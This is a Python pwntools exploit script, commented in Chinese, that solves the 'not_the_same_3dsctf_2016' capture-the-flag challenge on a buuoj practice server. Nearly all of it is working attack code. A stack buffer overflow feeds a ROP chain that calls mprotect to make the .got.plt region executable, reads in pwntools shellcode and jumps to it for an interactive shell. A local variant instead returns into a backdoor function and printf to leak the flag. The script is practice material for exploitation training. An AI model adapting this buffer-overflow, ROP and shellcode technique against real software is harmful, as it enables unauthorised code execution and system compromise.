from pwn import*

'''
# mprotect函数的利用，将目标地址：.got.plt或.bss段 修改为可读可写可执行
int mprotect(const void *start, size_t len, int prot);
argu1 为mprotect函数的第一个参数 (被修改内存的地址) 设置为 0x0x80EB000 (ida-ctrl+s 查看.got.plt/.bss起始地址) 
argu2 为mprotect函数的第二个参数 (被修改内存的大小) 设置为 0x1000 (0x1000通过程序启动时查看该内存块的大小的到的)
argu3 为mprotect函数的第三个参数 (被修改内存的权限) 设置为 7 = 4 + 2 +1 (rwx)

elf = ELF('./pwn')
# ROPgadget --binary get_started_3dsctf_2016 --only 'pop|ret' | grep pop
pop3_addr = 0x0806fcc8 # pop esi ; pop ebx ; pop edx ; ret
payload = 0x2D * 'a' + 0x4 * 'b' + p32(elf.symbols['mprotect'])
payload += p32(pop3_addr) # 返回地址覆盖为pop3，目的为了栈还原，因为mprotect传入了三个参数，需要连续3个pop
payload += p32(argu1) + p32(argu2) + p32(argu3)
# 紧接着返回地址为 read对修改的目标地址写入shellcode
payload += p32(elf.symbols['read']) 
payload += p32(pop3_addr) # 同样栈还原，为了执行紧接着的 目标地址
payload += p32(0) + p32(argu1) + p32(0x100)
# read写完后 写入执行的目标地址
payload += p32(argu1)
# 先进行sendline执行到read等待输入
sh.sendline(payload)
# 继续sendline发送shellcode
sh.sendline(asm(shellcraft.sh(), arch = 'i386', os = 'linux'))
# 进入交互模式
sh.interactive()
'''

context.log_level = 'debug'
context(arch='i386', os='linux')

local = 1
proc_name = '/mnt/hgfs/CyberSecurity/PWN/buuoj/not_the_same_3dsctf_2016'
elf = ELF(proc_name)

# 这道题本地和远程两种解法，真的干。。。
if local:
    sh = process(proc_name)
    str_flag_addr = 0x080ECA2D
    backdoor_addr = 0x080489A0
    printf_addr = 0x0804F0A0

    payload = 0x2D * b'a' # 这边不用覆盖ebp,在于get_flag并没有push ebp
    payload += p32(backdoor_addr) + p32(printf_addr)
    payload += p32(str_flag_addr)
    sh.sendline(payload)
else:
    sh = remote('node4.buuoj.cn', 25019)
    mprotect_addr = elf.symbols['mprotect']
    read_addr = elf.symbols['read']
    pop3_edi_esi_ebx_ret = 0x0806fcc8
    mem_addr = 0x080EB000 #.got.plt 的起始地址
    mem_size = 0x1000
    mem_type = 0x7 # 可执行权限

    payload = 0x2D * b'a'
    payload += p32(mprotect_addr)
    payload += p32(pop3_edi_esi_ebx_ret)
    payload += p32(mem_addr) + p32(mem_size) + p32(mem_type)
    payload += p32(read_addr)
    payload += p32(pop3_edi_esi_ebx_ret)
    payload += p32(0) + p32(mem_addr) + p32(0x100)
    payload += p32(mem_addr)    #将read函数的返回地址设置到我们修改的内存的地址，之后我们要往里面写入shellcode
    sh.sendline(payload)
    # read写入shellcode
    payload = asm(shellcraft.sh())
    sh.sendline(payload)

sh.interactive()